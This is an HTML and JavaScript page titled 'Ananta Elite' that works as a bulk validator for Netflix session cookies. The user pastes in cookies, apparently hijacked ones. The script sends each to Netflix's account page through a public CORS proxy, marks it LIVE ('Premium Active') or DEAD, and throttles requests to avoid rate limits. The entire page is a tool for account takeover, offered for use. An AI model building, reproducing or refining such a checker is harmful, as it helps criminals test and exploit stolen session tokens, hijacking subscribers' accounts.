<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ananta Elite - Functional Scanner</title>
    <link href="https://fonts.googleapis.com/css2?family=Syne:wght@700;800&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
    <style>
        :root {
            --bg: #050505;
            --panel: rgba(15, 15, 15, 0.85);
            --accent: #E50914;
            --border: rgba(255, 255, 255, 0.1);
            --green: #00FF88;
        }

        body {
            background-color: var(--bg);
            color: white;
            font-family: 'Syne', sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            overflow: hidden;
        }

        .main-wrapper { width: 95%; max-width: 1100px; display: flex; gap: 20px; height: 800px; }

        /* Sidebar */
        .sidebar {
            width: 300px; background: var(--panel); backdrop-filter: blur(20px);
            border-radius: 30px; border: 1px solid var(--border); padding: 40px 20px;
            display: flex; flex-direction: column; align-items: center;
        }
        .logo { border: 2px solid var(--accent); border-radius: 20px; padding: 20px; margin-bottom: 30px; text-align: center; }
        .logo h1 { font-size: 2rem; color: white; }

        /* Main Content */
        .content { flex: 1; display: flex; flex-direction: column; gap: 20px; }

        .stats-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 15px; }
        .stat-card { background: var(--panel); border: 1px solid var(--border); border-radius: 20px; padding: 20px; text-align: center; }
        .stat-card p { font-size: 2rem; font-family: 'JetBrains Mono'; }

        .glass-panel { background: var(--panel); border-radius: 25px; border: 1px solid var(--border); padding: 25px; flex: 1; overflow: hidden; display: flex; flex-direction: column; }

        textarea { 
            width: 100%; height: 120px; background: #000; border: 1px solid var(--border); 
            border-radius: 15px; padding: 15px; color: var(--green); font-family: 'JetBrains Mono'; 
            margin-bottom: 15px; outline: none;
        }

        .play-btn {
            width: 60px; height: 60px; background: transparent; border: 2px solid var(--green);
            color: var(--green); border-radius: 50%; cursor: pointer; transition: 0.3s;
            display: flex; align-items: center; justify-content: center; margin-left: auto;
        }
        .play-btn:hover { background: var(--green); color: black; box-shadow: 0 0 20px var(--green); }

        table { width: 100%; border-collapse: collapse; margin-top: 20px; }
        th { text-align: left; color: #444; font-size: 0.7rem; padding-bottom: 10px; }
        td { padding: 10px; border-top: 1px solid var(--border); font-family: 'JetBrains Mono'; font-size: 0.8rem; }
        
        .status-live { color: var(--green); font-weight: bold; }
        .status-dead { color: var(--accent); }
    </style>
</head>
<body>

<div class="main-wrapper">
    <div class="sidebar">
        <div class="logo">
            <h2 style="font-size: 0.7rem; color: #666;">ANANTA</h2>
            <h1>ELITE</h1>
        </div>
        <p style="color: #444; font-size: 0.8rem;">REAL-TIME VALIDATOR</p>
    </div>

    <div class="content">
        <div class="stats-grid">
            <div class="stat-card"><h4>Total</h4><p id="total">0</p></div>
            <div class="stat-card"><h4 style="color:var(--green)">Live</h4><p id="hits">0</p></div>
            <div class="stat-card"><h4 style="color:var(--accent)">Dead</h4><p id="dead">0</p></div>
        </div>

        <div class="glass-panel">
            <textarea id="cookie-input" placeholder="Paste Netflix Cookies (Netscape or JSON format)..."></textarea>
            <div style="display: flex; align-items: center;">
                <span id="status-label" style="color:#666; font-size: 0.8rem;">READY TO SCAN</span>
                <button class="play-btn" onclick="startValidation()">▶</button>
            </div>

            <div style="overflow-y: auto; flex: 1; margin-top: 15px;">
                <table>
                    <thead><tr><th>Source</th><th>Status</th><th>Note</th></tr></thead>
                    <tbody id="log-body"></tbody>
                </table>
            </div>
        </div>
    </div>
</div>

<script>
    let hits = 0, dead = 0;

    async function checkNetflixCookie(cookieString) {
        // We use a public CORS proxy to allow the browser to talk to Netflix
        const proxyUrl = "https://cors-anywhere.herokuapp.com/"; 
        const targetUrl = "https://www.netflix.com/YourAccount";

        try {
            const response = await fetch(proxyUrl + targetUrl, {
                method: 'GET',
                headers: {
                    'Cookie': cookieString,
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/91.0.4472.124 Safari/537.36'
                }
            });

            // If the cookie is live, Netflix redirects to the account page or returns 200
            // If it's dead, it usually redirects to the login page
            const finalUrl = response.url;
            if (response.ok && !finalUrl.includes('login')) {
                return { live: true, note: "Premium Active" };
            } else {
                return { live: false, note: "Expired/Invalid" };
            }
        } catch (err) {
            return { live: false, note: "Proxy/Network Error" };
        }
    }

    async function startValidation() {
        const input = document.getElementById('cookie-input').value.trim();
        if (!input) return alert("Please paste cookies!");

        const lines = input.split('\n').filter(l => l.length > 10);
        document.getElementById('total').innerText = lines.length;
        document.getElementById('status-label').innerText = "SCANNING...";

        for (let i = 0; i < lines.length; i++) {
            const result = await checkNetflixCookie(lines[i]);
            
            if (result.live) hits++; else dead++;

            const row = `<tr>
                <td>Cookie_Asset_${i+1}</td>
                <td class="${result.live ? 'status-live' : 'status-dead'}">${result.live ? 'LIVE' : 'DEAD'}</td>
                <td>${result.note}</td>
            </tr>`;

            document.getElementById('log-body').insertAdjacentHTML('afterbegin', row);
            document.getElementById('hits').innerText = hits;
            document.getElementById('dead').innerText = dead;
            
            // Artificial delay to prevent proxy rate-limiting
            await new Promise(r => setTimeout(r, 800));
        }
        document.getElementById('status-label').innerText = "FINISHED";
    }
</script>

</body>
</html>
